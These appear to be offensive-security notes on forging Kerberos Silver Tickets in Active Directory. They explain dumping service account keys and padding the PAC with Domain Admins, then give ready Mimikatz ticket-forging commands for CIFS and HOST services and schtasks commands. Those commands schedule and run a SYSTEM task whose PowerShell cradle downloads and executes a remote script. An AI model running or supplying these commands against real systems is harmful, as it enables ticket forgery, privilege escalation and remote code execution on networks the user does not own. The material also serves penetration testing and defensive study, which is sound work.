- STs are encrypted with the service user's key derived from it's password.
- If we have this key, we can forge ST's for any service running under that user. These tickets are called Silver Tickets.
- The key can be dumped from the lsass process memory or by [[#Kerberoast]], or dumping the entire AD Database (NTDS.dit file)
- The PAC is signed with the `krbtgt`'s account, hence a fake signature is used to create the PAC. The PAC signature is not verified if the the ticket is less than 20 minutes old. We can also add more privilege to the PAC, as it is not verified. For example, we can modify the PAC user group to include the `Domain Admins`. 
### Mimikatz
- Mimikatz can be used to forge silver tickets
```powershell
# Create silver ticket to list shares on the machine
kerberos::golden /domain:mydomain.local /sid:<domain-sid> /target:<targetmachine-FQDN> /service:cifs /rc4:<key> /user:Administrator /ptt

# Create silver ticket to gain remote execution on the machine.
# set /service:HOST, this allows to schedule tasks on the machine.
kerberos::golden /domain:mydomain.local /sid:<domain-sid> /target:<targetmachine-FQDN> /service:HOST /rc4:<key> /user:Administrator /ptt
# verifiy with klist
klist
# shchedule the malicious task
schtasks /create /S machine.mydomain.local /SC Weekly /RU "NT Authoririty\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DonwloadString(''http://ip/file.ps1''')'"
# Run the task
schtasks /Run /S machine.mydomain.local /TN "STCheck"
